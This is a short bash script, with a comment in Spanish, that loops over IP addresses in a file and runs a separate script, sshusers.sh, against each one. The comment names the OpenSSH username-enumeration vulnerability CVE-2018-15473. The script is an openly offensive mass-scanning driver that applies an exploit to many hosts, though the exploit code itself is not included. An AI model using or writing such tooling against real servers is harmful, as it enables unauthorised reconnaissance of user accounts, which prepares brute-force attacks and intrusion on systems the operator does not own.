#!/bin/bash
# Explotar vulnerabilidad 2018-15473 OpenSSH 2.3 < 7.7 Username Enumeration

for i in `cat ip.txt`
do
        echo $i
        ./sshusers.sh $i
done
